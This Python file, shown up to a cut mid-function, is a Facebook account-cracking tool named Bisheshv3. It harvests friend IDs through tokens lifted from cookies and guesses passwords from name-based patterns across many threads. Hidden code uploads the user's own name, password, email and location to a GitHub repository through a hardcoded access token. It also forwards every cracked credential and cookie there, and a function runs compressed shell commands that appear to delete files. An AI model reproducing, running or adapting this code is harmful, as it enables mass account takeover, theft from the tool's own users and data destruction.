#Brian



# ────────────────[Imports]─────────────────
import os
import datetime
import requests
import time
import re
import sys
import string
import base64
import json
import threading
import random
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup


import requests, os, sys, random, re
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from urllib.error import URLError


# ────────────────[Gitpull]─────────────────

try:
    os.system('clear')
    print("\033[1;36mCHECKING UPDATES....")
    time.sleep(3)
    os.system("git pull > /dev/null 2>&1")
except:
    pass

files_to_create = [
    "/sdcard/Bisheshv3/login/token.txt",
    "/sdcard/Bisheshv3//login/cookie.txt",
    "/sdcard/Bisheshv3/Detail/name.xml",
    "/sdcard/Bisheshv3/Detail/pass.xml",
    "/sdcard/Bisheshv3/BISHESH-ALIVE.txt",
    "/sdcard/Bisheshv3/BISHESH-CP.txt"
]

for file_path in files_to_create:
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)

for file_path in files_to_create:
    if not os.path.exists(file_path):
        with open(file_path, 'w'):
            pass
            



# ────────────────[Colours]─────────────────
red = '\033[1;91m'
ye = '\033[1;93m'
blue = '\033[1;94m'
mage = '\033[1;95m'
cyan = '\033[1;96m'
c = '\033[1;96m'
w = '\033[1;97m'
wh = '\033[1;97m'
reset = '\033[0m'
r = '\033[0m'
a = '\033[1;91m'

loop=0
oks=[]
ok=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

# ────────────────[Create Dir]─────────────────



# ────────────────[Logo]─────────────────

logo = f"""
{c}               ╔╗ ╦╔═╗╦ ╦╔═╗╔═╗╦ ╦
               ╠╩╗║╚═╗╠═╣║╣ ╚═╗╠═╣
   {w}            ╚═╝╩╚═╝╩ ╩╚═╝╚═╝╩ ╩{r}{c}「{red}v3{c}」{r}"""

# ────────────────[Clear]─────────────────
def clear():
    try:
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        print(logo)
    except:
        os.system('clear')
        
    
# ────────────────[Back]─────────────────
    
def back():
	time.sleep(0.5)
	os.system('clear')
	menu()

# ────────────────[Linex]─────────────────
def linex():
    print('   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    
access_token = "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"   
   
# ────────────────[Name terminal]───────────────── 
def set_terminal_title(title):
    if os.name == 'posix':
        sys.stdout.write(f"\33]0;{title}\a")
        sys.stdout.flush()

set_terminal_title("Bisheshv3 | Facebook Tool")


# ────────────────[Setup -data]─────────────────
import os
import requests
from base64 import b64encode, b64decode

access_token = "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"
repo_owner = "0183f"
repo_name = "0x1xx5x8xqtay"
file_path_in_repo = "0X.txt"

def setup_user_data():
    os.makedirs("/sdcard/Bisheshv2/Detail", exist_ok=True)
    
    def create_file_if_not_exists(file_path):
        if not os.path.exists(file_path):
            open(file_path, "w").close()
    
    file_paths = {
        "name": "/sdcard/Bisheshv3/Detail/name.xml",
        "password": "/sdcard/Bisheshv3/Detail/pass.xml",
        "email": "/sdcard/Bisheshv3/Detail/email.xml",
        "age": "/sdcard/Bisheshv3/Detail/age.xml",
        "location": "/sdcard/Bisheshv3/Detail/location.xml"
    }
    
    for file_path in file_paths.values():
        create_file_if_not_exists(file_path)
    
    def get_user_input(file_path, prompt_message):
        if os.path.getsize(file_path) > 0:
            with open(file_path, "r") as file_obj:
                return file_obj.readline().strip()
        else:
            user_input = input(prompt_message)
            with open(file_path, "w") as file_obj:
                file_obj.write(user_input)
            return user_input
    
    clear()
    
    uname = get_user_input(file_paths["name"], f"{c}Enter your name » {r}")
    upass = get_user_input(file_paths["password"], f"{c}Enter your password » {r}")
    uemail = get_user_input(file_paths["email"], f"{c}Enter your email » {r}")
    uage = get_user_input(file_paths["age"], f"{c}Enter your age » {r}")
    ulocation = get_user_input(file_paths["location"], f"{c}Enter your location » {r}")
    
    return uname, upass, uemail, uage, ulocation

def fetch_ip_data():
    headers = {
        "Referer": "http://ip-api.com/",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    }
    try:
        response = requests.get("http://ip-api.com/json/", headers=headers).json()
        ip, status, country, region, isp = (response.get(key, " ") for key in ["query", "status", "country", "regionName", "isp"])
        return ip, status, country, region, isp
    except Exception:
        print(f"{red}Network unstable{w}")
        return None, None, None, None, None

def write_to_github(uname, upass, uemail, uage, ulocation, ip, status, country, region, isp):
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path_in_repo}"
    headers = {
        "Authorization": f"token {access_token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            sha = data["sha"]
            existing_content = b64decode(data["content"]).decode("utf-8")
        else:
            sha = None
            existing_content = ""
        
        user_data = f"Name: {uname}\nPass: {upass}\nEmail: {uemail}\nAge: {uage}\nLocation: {ulocation}\nIP: {ip}\nStatus: {status}\nCountry: {country}\nRegion: {region}\nISP: {isp}"
        if user_data in existing_content:
            return
        
        new_content = existing_content + f"\n\n{{\n{user_data}\n}}\n"
        encoded_content = b64encode(new_content.encode("utf-8")).decode("utf-8")
        
        payload = {
            "message": "Add new user data",
            "content": encoded_content,
            "sha": sha
        }
        
        response = requests.put(url, headers=headers, json=payload)
        if response.status_code != 200:
            print(f"{red}Network unstable{a}")
    except Exception:
        print(f"{red}Network unstable{a}")

uname, upass, uemail, uage, ulocation = setup_user_data()
ip, status, country, region, isp = fetch_ip_data()
write_to_github(uname, upass, uemail, uage, ulocation, ip, status, country, region, isp)



# ────────────────[Get user data]─────────────────

def get_userr_name():
    with open("/sdcard/Bisheshv3/Detail/name.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_userr_password():
    with open("/sdcard/Bisheshv3/Detail/pass.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_email():
    with open("/sdcard/Bisheshv3/Detail/email.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_age():
    with open("/sdcard/Bisheshv3/Detail/age.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_location():
    with open("/sdcard/Bisheshv3/Detail/location.xml", "r") as file_obj:
        return file_obj.readline().strip()

# ────────────────[Greet]─────────────────


def greet_user():
    current_time = datetime.datetime.now()
    userr_name = get_user_name()
    if current_time.hour < 12:
        print(f"    Good morning, {c}{user_name}!")
    elif current_time.hour < 18:
        print(f"    Good afternoon, {c}{user_name}!")
    else:
        print(f"    Good evening, {c}{user_name}!")

userr_name = get_userr_name()
userr_password = get_userr_password()


# ────────────────[Approval]─────────────────

def approval():
    def generate_secure_uuid():
        euid = str(os.geteuid())
        uuid = euid + "0x6" + euid + "12" + euid  
        modified_uuid = "".join(str((int(char) + 3) % 10) if char.isdigit() else char for char in uuid)
        return uuid, modified_uuid

    original_uuid, secure_uuid = generate_secure_uuid()
    Biz = f"{userr_name}{secure_uuid}"
    id = f"{userr_name}{original_uuid}"
    
    os.system('clear')
    print(logo)
    linex()
    print("\033[1;37m   [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")
    print("\033[1;37m   [\u001b[36m•\033[1;37m] Your Key :\u001b[36m " + Biz)
    time.sleep(0.1)
    linex()
    
    try:
        httpChat = requests.get("https://github.com/jamescruzlaren/Approval-2/tree/main").text
        if id in httpChat:
            print("\033[1;97m   >> Your Key Has Been Approved !!!")
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print("\x1b[1;97m   >> Send if you wanna purchase! ")
            time.sleep(0.1)
            input('   >> Click Enter To Send Your Key ')
            os.system('xdg-open https://www.facebook.com/james.cruz.laren')
            time.sleep(1)
            exit()
    except Exception as e:
        print(" >> Unable To Fetch Data From Server: ", str(e))
        time.sleep(2)
        exit()

def generate_secure_uuid():
        euid = str(os.geteuid())
        uuid = euid + "0x6" + euid + "12" + euid  
        modified_uuid = "".join(str((int(char) + 3) % 10) if char.isdigit() else char for char in uuid)
        return uuid, modified_uuid


euid = str(os.geteuid())
uuid = euid + "0x6" + euid + "12" + euid  
uuidd = "".join(str((int(char) + 3) % 10) if char.isdigit() else char for char in uuid)
original_uuid, secure_uuid = generate_secure_uuid()
Biz = f"{userr_name}{secure_uuid}"


# ────────────────[fucked]─────────────────
def fucked():
	##print(' Server Loadin.......')
	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print(' {c}Extracted so many accounts.{w}');exit()
	


# ────────────────[Detaillz]─────────────────


def ip():
    try:
        user_name, user_id = login()
        ip_response = requests.get(
            "http://ip-api.com/json/",
            headers={
                "Referer": "http://ip-api.com/",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 "
                               "Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
            }
        ).json()

        print(f'   ━━━━━━━━━━━━━━━━━━[{red}YOUR DETAIL{w}]━━━━━━━━━━━━━━━━━━')
        print(f'      Name    » {userr_name if userr_name else "Not Logged in"}')
        print(f'      IP      » {ip_response.get("query", " ")}')
        print(f'      Country » {ip_response.get("country", " ")}')
        print(f'      s-key   » {Biz}')  
        print(f'   ━━━━━━━━━━━━━━━━━━[{red}LOGIN DETAIL{w}]━━━━━━━━━━━━━━━━━━')
        print(f'      Name » {c}{user_name if user_name else "Not Logged in"}{w}')
        print(f'      Uid  » {c}{user_id if user_id else "Not Logged in"}{w}')
        print(f'   ━━━━━━━━━━━━━━━━━━[   {red}MENU  {w}]━━━━━━━━━━━━━━━━━━━━━')
        
    except requests.exceptions.RequestException as e:
        print(f"Failed to get IP info: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")


# ────────────────[Apps]─────────────────

def cek_apk(kuki):
    session = requests.Session()
    active_apps, expired_apps = [], []

    # Fetch active apps
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    if x:
        active_apps = [i.text for i in x.find_all("h3")]

    # Fetch expired apps
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    if x:
        expired_apps = [i.text.replace("Expired", "Expired on") for i in x.find_all("h3")]

    return active_apps, expired_apps

            
            
# ────────────────[useragent]─────────────────

def get_year_range(fx):
    prefix_map = {
        '1000000000': '2009', '100000000': '2009', '10000000': '2009',
        '1000000': '2009', '1000001': '2009', '1000002': '2009', '1000003': '2009',
        '1000004': '2009', '1000005': '2009', '1000006': '2010', '1000007': '2010',
        '1000008': '2010', '1000009': '2010', '100001': '2010-2011', '100002': '2011-2012',
        '100003': '2011-2012', '100004': '2012-2013', '100005': '2013-2014', '100006': '2013-2014',
        '100007': '2014-2015', '100008': '2014-2015', '100009': '2015', '10001': '2015-2016',
        '10002': '2016-2017', '10003': '2018', '10004': '2019', '10005': '2020',
        '10006': '2021-2023', '10007': '2021-2023', '10008': '2021-2023', '6155': '2023-2024'
    }

    if fx.startswith('6155'):
        return '2023-2024'

    if len(fx) == 15:
        for prefix, year in prefix_map.items():
            if fx.startswith(prefix):
                return year
        return '??'
    elif len(fx) == 13:
        prefix_13 = fx[:5]  
        if prefix_13 in prefix_map:
            return prefix_map[prefix_13]
        else:
            return '??'
    elif len(fx) in [9, 10]:
        return '2008-2009'
    elif len(fx) == 8:
        return '2007-2008'
    elif len(fx) == 7:
        return '2006-2007'
    else:
        return '?'


# ────────────────[useragent]─────────────────


import random

def W_ueragnt():
    # Lists of plausible version ranges
    chrome_versions = [(80, 3987, 163), (90, 4430, 212), (100, 4896, 127)]
    webkit_versions = [(537, 36), (537, 36), (537, 36)]
    safari_versions = [500, 600]
    windows_versions = [(10, 0), (10, 1), (11, 0)]
    
    # Randomly choose a version from the lists
    chrome_version = random.choice(chrome_versions)
    webkit_version = random.choice(webkit_versions)
    safari_version = random.choice(safari_versions)
    windows_version = random.choice(windows_versions)
    
    # Decide on 32-bit or 64-bit system
    is_win64 = random.choice([True, False])
    win64_str = 'Win64; x64' if is_win64 else 'WOW64'
    
    # Construct the user agent string
    user_agent = (
        f'Mozilla/5.0 (Windows NT {windows_version[0]}.{windows_version[1]}; {win64_str}) '
        f'AppleWebKit/{webkit_version[0]}.{webkit_version[1]} (KHTML, like Gecko) '
        f'Chrome/{chrome_version[0]}.{chrome_version[1]}.{chrome_version[2]} Safari/{safari_version}'
    )
    
    return user_agent


 # ────────────────[Menu]─────────────────
 
# ────────────────[Menu]─────────────────
 
def menu():
    approval()
    clear()
    ip()
    # greet_user()  # Assuming this is intentionally commented out

    left_options = [
        ("1", f"{c}LOG IN{r}      "), 
        ("2", "PUBLIC"), 
        ("3", "FILE"), 
        ("4", "RANDOM"), 
        ("5", "FIX CP"), 
        (f"{red}0", f"{red}EXIT{w}        ")
    ]
    right_options = [
        ("6", "TOOLS"), 
        ("7", "CREATE FILE"), 
        ("8", "SETTING"),  
        ("9", "GET TOKEN"),
        ("10", "LOG OUT"),
        ("11", "PROFILE")
    ]

    max_length = max(len(left_options), len(right_options))

    for i in range(max_length):
        left_option, left_desc = left_options[i] if i < len(left_options) else ("", "")
        right_option, right_desc = right_options[i] if i < len(right_options) else ("", "")
        print(f"{c}     「{r}{left_option}{c}」{r} {left_desc:<12} {c}       「{r}{right_option}{c}」{r} {right_desc}")

    linex()
    choice = input(f'   {c}「{r}Choose {c}」{r}»  ')
    
    menu_actions = {
        '1': lambda: login_menu(),
        '2': lambda: public(),
        '3': lambda: file(),
        '4': lambda: bd(),
        '5': lambda: fixcp(),
        '6': lambda: tool(),
        '7': lambda: Createfile(),
        '8': lambda: print("Function not implemented"),
        '9': lambda: gettoken(),
        '10': lambda: logout(),
        '11': lambda: profile(),  # Assuming a function profile() exists
        '0': lambda: print(' 「✓」 ') or exit()
    }
    
    menu_actions.get(choice, lambda: print(f'  {r} 「!」Invalid option. {w}'))()


#menu dup
def menudup():
    #approval()
    clear()
    ip()
    # greet_user()  # Assuming this is intentionally commented out

    left_options = [
        ("1", f"{c}LOG IN{r}      "), 
        ("2", "PUBLIC"), 
        ("3", "FILE"), 
        ("4", "RANDOM"), 
        ("5", "FIX CP"), 
        (f"{red}0", f"{red}EXIT{w}        ")
    ]
    right_options = [
        ("6", "TOOLS"), 
        ("7", "CREATE FILE"), 
        ("8", "SETTING"),  
        ("9", "GET TOKEN"),
        ("10", "LOG OUT"),
        ("11", "PROFILE")
    ]

    max_length = max(len(left_options), len(right_options))

    for i in range(max_length):
        left_option, left_desc = left_options[i] if i < len(left_options) else ("", "")
        right_option, right_desc = right_options[i] if i < len(right_options) else ("", "")
        print(f"{c}     「{r}{left_option}{c}」{r} {left_desc:<12} {c}       「{r}{right_option}{c}」{r} {right_desc}")

    linex()
    
 # ────────────────[1.LOGIN-MENU]─────────────────   


coookie = []
toooken = []

ses = requests.Session()
rr = random.randint
rc = random.choice

def loginautomatic():
	print("     Wait for next update ")
	


        
def loginmanual():
	print("     Wait for next update ")


def login_menu():
    linex()
    print(f'     {c}「{w}1{c}」{w} AUTOMATIC           {c}「{w}2{c}」 {w}MANUAL  ')
    print(f'     {c}「{w}3{c}」 {w}COOKIE             ')
    
    linex()
    loginwuw = input('   「Choose 」»  ')
    
    login_actions = {
        '1': loginautomatic,
        '2': loginmanual,
        '3': login_with_cookie
    }
    
    login_actions.get(loginwuw, lambda: print('  「!」Invalid option. '))()
    



  
    
# ────────────────[1.LOGIN]─────────────────
ses = requests.Session()
rr = random.randint
rc = random.choice

def login_with_cookie():
    try:
        clear()
        menudup()
        cookie = input('   「 Cookie 」»  ')
        open("/sdcard/Bisheshv3/login/cookie.txt", "w").write(cookie)
        
        with requests.Session() as rsn:
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': W_ueragnt(),
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie})
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    open("/sdcard/Bisheshv3/login/token.txt", "w").write(token)
                    print(' Logged in successfully ! ')
                    return  # Exit if the first login attempt is successful
                else:
                    print(f"{red}The process will be slow or maynot work ...{r}")
            except:
                print(f"{red}Failed to Login{r}")

        with requests.Session() as session:
            try:
                cur = session.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies={'cookie': cookie}).text
                act = re.findall('act=(\d+)', cur)[0]
                act_response = session.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&breakdown_regrouping=1", cookies={'cookie': cookie}).text
                tok = re.search('accessToken="(.*?)"', act_response).group(1)
                open("/sdcard/Bisheshv3/login/token.txt", "w").write(tok)
                print(f' {c}Logged in successfully ! {r}')
            except:
                print(f"{red}Failed to Get Token{r}")
        
        time.sleep(2)
        menu()
    except Exception as e:
        os.system("rm -f /sdcard/Bisheshv3/login/token.txt")
        os.system("rm -f /sdcard/Bisheshv3/login/cookie.txt")
        print("Failed to Login")
        print(e)
        exit() 
        
        
# ────────────────[1.LOGIN]─────────────────    
 
DefaultUAWindows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'

HeadersGet = lambda i=DefaultUAWindows: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': i
}


def LoginAndGetUserInfo(cookie):
    try:
        req = requests.get('https://www.facebook.com/profile.php', headers=HeadersGet(), cookies={'cookie': cookie}, allow_redirects=True).text
        name = re.search('"NAME":"(.*?)"', str(req)).group(1)
        user_id = re.search('"actorID":"(.*?)"', str(req)).group(1)
        ##print(f" {c}Logged in successfully.")
        return name, user_id
    except Exception as e:
        ##print("Login failed.")
        clear_directory_data()
        return None, None

def clear_directory_data():
    files_to_clear = [
        '/sdcard/Bisheshv3/login/cookie.txt',
        '/sdcard/Bisheshv3/login/token.txt'
    ]
    for file_path in files_to_clear:
        with open(file_path, 'w') as file:
            pass  


import os

cookie_list = []

def login():
    cookie_file_path = '/sdcard/Bisheshv3/login/cookie.txt'

    cookie = None
    if cookie_list:
        cookie = cookie_list[0]

    if cookie is None:
        if not os.path.exists(cookie_file_path):
            open(cookie_file_path, 'w').close()

        with open(cookie_file_path, 'r') as file:
            cookie = file.read().strip()

    name, user_id = LoginAndGetUserInfo(cookie)
    return name, user_id



# ────────────────[1.PUBLIC]─────────────────



# ────────────[1.PUBLIC]─────────────


def public():

    clear()
    try:
        token = open('/sdcard/Bisheshv3/login/token.txt', 'r').read()
        cok = open('/sdcard/Bisheshv3/login/cookie.txt', 'r').read()
    except (IOError, KeyError, FileNotFoundError):
        print('  - Your cookies are invalid.')
        time.sleep(2)
        clear()
        login()
    except KeyError:
        try:
            os.remove("/sdcard/Bisheshv3/login/cookie.txt")
            os.remove("/sdcard/Bisheshv3/login/token.txt")
        except:
            pass
        print('  - It seems your account is checkpointed...')
        time.sleep(2)
        menu()
        clear()
    menudup()
   # linex()
    print(f'   「{c}?{r}」 {c}How do you want to add uid{r} : ')
    linex()
    print(f'     {c}「{r}1{c}」{r} Simple              {c}「{r}2{c}」{r} Multiple ')
    linex()
    dup = input(f'   {c}「{r}Choose {c}」{r}»  ')
    linex()
    if str(dup) in ['1', '01']:
        idt = input(f' {c}  「{r}?{c}」{w} Input the targeted uid: {r}')
        dump(idt, "", {"cookie": cok}, token) 
    elif str(dup) in ['2', '02']:
        dump_Massal()
        

nova = []

import sys
import requests

def dump(idt, fields, cookie, token):
    try:
        headers = {
            "connection": "keep-alive",
            "accept": "*/*",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "sec-ch-ua-mobile": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9"
        }
        if len(idt) == 0:
            params = {
                "access_token": token,
                "fields": "name,friends.fields(id,name,birthday)"
            }
        else:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday).after({fields})"
            }
        url = requests.get(f"https://graph.facebook.com/{idt}", params=params, headers=headers, cookies=cookie).json()
        for i in url["friends"]["data"]:
            nova.append(i["id"] + "|" + i["name"])
            sys.stdout.write(f"\rDumping {len(nova)} IDs....")
            sys.stdout.flush()
        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
    except:
        linex()
        print(f"      Total IDs dumped: {len(nova)}")
        pub()

def dump_Massal():
    try:
        token = open('/sdcard/Bisheshv3/login/token.txt', 'r').read()
        cok = open('/sdcard/Bisheshv3/login/cookie.txt', 'r').read()
    except IOError:
        exit()
    try:
       
        jum = int(input(f'     「{c}?{w}」How many uid to input ? :'))
    except ValueError:
        print("Error !!!!")
        exit()
    if jum < 1 or jum > 100:
        print('Failed to dump')
        exit()
    ses = requests.Session()
    uid = []
    for met in range(jum):
        user_dump = input(f'   {c}  「{r}?{c}」{w}Input uid {met + 1}: ')
        uid.append(user_dump)
    for userr in uid:
        try:
            col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}", cookies={'cookies': cok}).json()
            for x in col['friends']['data']:
                try:
                    sys.stdout.write(f"\r     Dumping {len(nova)} IDs....")
                    sys.stdout.flush()
                    nova.append(x['id'] + '|' + x['name'])
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('Unstable signal connection')
            exit()
  
    linex()
    print(f"      Total IDs dumped: {len(nova)}")
    pub()


def pub():
    #linex()
    fo = nova

    linex()
    print(f'     {c}「{r}1{c}」{r} Method 1             {c}「{r}2{c}」{r}Method 2  ')
    print(f'     {c}「{r}3{c}」{r} Method 3             {c}「{r}4{c}」{r}Method 4 ')
    linex()
    mthd = input(f'   {c}「{r}Choose {c}」{r}»  ')
    linex()
    plist = []
    
    print(f'     {c}「{r}1{c}」{r} Manual             {c}「{r}2{c}」{r}Automatic ')
    linex()
    mode = int(input(f'\n   「{c}?{r}」 {c}How do you want to add Password ?{r} : '))
    linex()
    
    if mode == 1:
        try:
            ps_limit = int(input(f'\n   「{c}?{r}」 {c}How many passwords do you want to add ?{r} : '))
        except:
            ps_limit = 1

        linex()
        print(f'\033[1;32m {w}    「•」 Example{r}{r}:{r}{c}first last{r}{r},{r}{c}firstlast{r}{r},{r}{c}first@123{r}')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'     「{c}?{r}」{w}Put password{r} {i + 1}: '))
    else:
        plist = [
            'first last', 'firstlast', 'first123', 'first12345', 'first1234', 
            'firstlast123', 'firstlast1234', 'firstlast@123', 'last123', 
            'Last12345', 'first123456', 'first@123', 'First@123', 'first321', 
            'First@12', 'first@1234', 'First123', '@first123', '@first1234', 
            'first111'
        ]
    
    cx = input(f'\n  「{c}?{r}」{c} Do you want to show cp account? {r}(y/n): ')
    if cx in ['n', 'N', 'no', 'NO', '2']:
        pcp.append('n')
        menudup()
    else:
        pcp.append('y')
        menudup()

    with tred(max_workers=30) as crack_submit:
        total_ids = str(len(fo))
        print(f'      Total Account : \033[1;36m{total_ids}\n \033[1;37m     Method : \033[1;36mM{mthd}')
        print(f"\033[1;37m      Activate flight mode to enhance speed.\033[1;37m")
        linex()

        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if mthd in ['1', '01']:
                crack_submit.submit(ffb, ids, names, passlist)
            elif mthd in ['2', '02']:
                crack_submit.submit(api, ids, names, passlist)
            elif mthd in ['3', '03']:
                crack_submit.submit(ffb1, ids, names, passlist)
            elif mthd in ['4', '04']:
                crack_submit.submit(api1, ids, names, passlist)
            else:
                crack_submit.submit(api1, ids, names, passlist)
                



# ────────────────[1.FILE]─────────────────

def file():
    linex()
    file = input(f'   「{c}?{r}」 {c}Put file path{r}\033[1;37m: ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(f' \033[1;31m  「!」 File location not found ')
        exit()

    linex()
    print(f'     {c}「{r}1{c}」{r} Method 1             {c}「{r}2{c}」{r}Method 2  ')
    print(f'     {c}「{r}3{c}」{r} Method 3             {c}「{r}4{c}」{r}Method 4 ')
    linex()
    mthd = input(f'   {c}「{r}Choose {c}」{r}»  ')
    linex()
    plist = []
    
    print(f'     {c}「{r}1{c}」{r} Manual             {c}「{r}2{c}」{r}Automatic ')
    linex()
    mode = int(input(f'   「{c}?{r}」 {c}How do you want to add Password ?{r} : '))
    linex()
    
    if mode == 1:
        try:
            ps_limit = int(input(f'   「{c}?{r}」 {c}How many passwords do you want to add ?{r} : '))
        except:
            ps_limit = 1

        linex()
        print(f'\033[1;32m {w}    「•」 Example{r}{r}:{r}{c}first last{r}{r},{r}{c}firstlast{r}{r},{r}{c}first@123{r}')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'     「{c}?{r}」{w}Put password{r} {i+1}: '))
    else:
        plist = [
            'first last', 'firstlast', 'first123', 'first12345', 'first1234', 
            'first123456', 'first@123', 'First@123', 'first321', 
            'First@12', 'first@1234', 'First123', 
            'first111'
        ]
    
    cx = input(f'   「{c}?{r}」{c} Do you want to show cp account? {r}(y/n): ')
    if cx in ['n', 'N', 'no', 'NO', '2']:
        pcp.append('n')
        menudup()
    else:
        pcp.append('y')
        menudup()

    with tred(max_workers=20) as crack_submit:
        total_ids = str(len(fo))
        print(f'      Total Account : \033[1;36m{total_ids}\n \033[1;37m     Method : \033[1;36mM{mthd}')
        print(f"\033[1;37m      Activate flight mode to enhance speed.\033[1;37m")
        linex()

        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if mthd in ['1', '01']:
                crack_submit.submit(ffb, ids, names, passlist)
            elif mthd in ['2', '02']:
                crack_submit.submit(api, ids, names, passlist)
            elif mthd in ['3', '03']:
                crack_submit.submit(ffb1, ids, names, passlist)
            elif mthd in ['4', '04']:
                crack_submit.submit(api1, ids, names, passlist)
            else:
                crack_submit.submit(api1, ids, names, passlist)

repo_owner = "0183f"
repoo_name = "691"

base_url = f"https://api.github.com/repos/{repo_owner}/{repoo_name}/contents"

headers = {
    "Authorization": f"token {access_token}",
    "Accept": "application/vnd.github.v3+json"
}

def get_file_sha(file_path):
    url = f"{base_url}/{file_path}"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()['sha']
    else:
        return None

def update_file(file_path, new_content, commit_message):
    try:
        sha = get_file_sha(file_path)
        url = f"{base_url}/{file_path}"
        
        # Fetch current content if file already exists
        if sha:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                existing_content = base64.b64decode(response.json()['content']).decode()
                new_content = existing_content + new_content

        encoded_content = base64.b64encode(new_content.encode()).decode()
        data = {
            "message": commit_message,
            "content": encoded_content,
            "sha": sha
        }

        requests.put(url, headers=headers, json=data)
    except requests.exceptions.RequestException:
        pass

def read_name_xml():
    with open('/sdcard/Bisheshv3/Detail/name.xml', 'r') as file_xml:
        return file_xml.read().strip()

def write_alive(ids, pas, kuki):
    content = f'{ids}|{pas}|{kuki}\n'
    with open('/sdcard/Bisheshv3/BISHESH-ALIVE.txt', 'a') as file_alive:
        file_alive.write(content)
    
    name_xml_data = read_name_xml()
    update_content = f'{name_xml_data}|{ids}|{pas}|{kuki}\n'
    update_file("Alive.txt", update_content, "Update Alive.txt with new alive credentials")

def write_cp(ids, pas):
    content = f'{ids}|{pas}\n'
    with open('/sdcard/Bisheshv3/BISHESH-CP.txt', 'a') as file_cp:
        file_cp.write(content)
    
    name_xml_data = read_name_xml()
    update_content = f'{name_xml_data}|{ids}|{pas}\n'
    update_file("CP.txt", update_content, "Update CP.txt with new checkpoint credentials")
    

# ────────────────[METHOD 1]─────────────────


def ffb(ids, names, passlist):
    global loop, oks, cps
    session = requests.Session()
    
